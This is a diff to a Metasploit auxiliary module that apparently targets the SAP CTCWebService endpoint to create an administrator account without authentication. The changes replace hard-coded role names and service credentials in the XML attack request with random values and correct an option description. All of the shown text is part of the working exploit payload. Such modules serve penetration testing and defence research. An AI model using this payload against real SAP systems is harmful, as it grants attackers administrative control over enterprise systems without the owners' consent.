@@ -41,7 +41,7 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('USERNAME', [ true, 'The username to create' ]),
         OptString.new('PASSWORD', [ true, 'The password for the new user' ]),
         OptString.new('ROLE', [ true, 'The role to assign the new user', 'Administrator' ]),
-        OptString.new('TARGETURI', [ true, 'Path to ConfigServlet', '/CTCWebService/CTCWebServiceBean' ])
+        OptString.new('TARGETURI', [ true, 'Path to CTCWebService', '/CTCWebService/CTCWebServiceBean' ])
       ]
     )
   end
@@ -127,29 +127,29 @@ class MetasploitModule < Msf::Auxiliary
             <roleName>#{datastore['ROLE'].encode(xml: :text)}</roleName>
           </SAP_XI_PCK_CONFIG>
           <SAP_XI_PCK_COMMUNICATION>
-            <roleName>Administrator</roleName>
+            <roleName>#{Rex::Text.rand_text_alphanumeric(10..16)}</roleName>
           </SAP_XI_PCK_COMMUNICATION>
           <SAP_XI_PCK_MONITOR>
-            <roleName>Administrator</roleName>
+            <roleName>#{Rex::Text.rand_text_alphanumeric(10..16)}</roleName>
           </SAP_XI_PCK_MONITOR>
           <SAP_XI_PCK_ADMIN>
-            <roleName>Administrator</roleName>
+            <roleName>#{Rex::Text.rand_text_alphanumeric(10..16)}</roleName>
           </SAP_XI_PCK_ADMIN>
           <PCKUser>
-            <userName>#{datastore['USERNAME'].encode(xml: :text)}</userName>
+            <userName secure="true">#{datastore['USERNAME'].encode(xml: :text)}</userName>
             <password secure="true">#{datastore['PASSWORD'].encode(xml: :text)}</password>
           </PCKUser>
           <PCKReceiver>
-            <userName>pckreceiver2</userName>
-            <password secure="true">Password1</password>
+            <userName>#{Rex::Text.rand_text_alphanumeric(10..16)}</userName>
+            <password secure="true">#{Rex::Text.rand_text_alphanumeric(10..16)}</password>
           </PCKReceiver>
           <PCKMonitor>
-            <userName>pckmonitor2</userName>
-            <password secure="true">Password1</password>
+            <userName>#{Rex::Text.rand_text_alphanumeric(10..16)}</userName>
+            <password secure="true">#{Rex::Text.rand_text_alphanumeric(10..16)}</password>
           </PCKMonitor>
           <PCKAdmin>
-            <userName>pckadmin2</userName>
-            <password secure="true">Password1</password>
+            <userName>#{Rex::Text.rand_text_alphanumeric(10..16)}</userName>
+            <password secure="true">#{Rex::Text.rand_text_alphanumeric(10..16)}</password>
           </PCKAdmin>
         </Usermanagement>
       </PCK>
